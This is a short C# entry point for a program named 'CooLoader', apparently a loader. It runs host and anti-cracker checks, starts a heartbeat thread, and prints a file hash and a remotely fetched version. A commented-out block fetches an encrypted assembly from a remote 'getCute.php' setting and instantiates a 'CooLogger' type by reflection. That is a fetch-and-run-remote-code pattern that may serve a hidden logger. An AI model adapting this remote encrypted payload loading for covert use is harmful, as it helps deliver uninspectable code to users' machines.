using System;
using System.Reflection;
using System.Threading;
using CooLoader.Util.Checking;
using CooLoader.Util.Encryption;
using CooLoader.Util.Net;

namespace CooLoader
{
    class Program
    {
        static void Main()
        {
            if(!new HostChecker(true).IsValid())
            {
                CrackerCheck.FlagCracker();    
            }
            if(CrackerCheck.IsCracker())
            {
                Console.WriteLine("Cracker!");
            }
            
            HeartBeat hb = new HeartBeat();
            Thread oThread = new Thread(hb.Beat);
            oThread.Start();
            /*
            Assembly encASM = new EncryptedAssembly(RemoteSettings.GrabSetting("getCute.php")).GetAssembly();
            Type type = encASM.GetType("CooLogger");
            Activator.CreateInstance(type);*/

            Console.WriteLine(new FileHasher(Configuration.RunningLocation).GetMD5());
            Console.WriteLine("Version: " + RemoteSettings.GrabSetting("getVersion.php"));
        }
    }
}
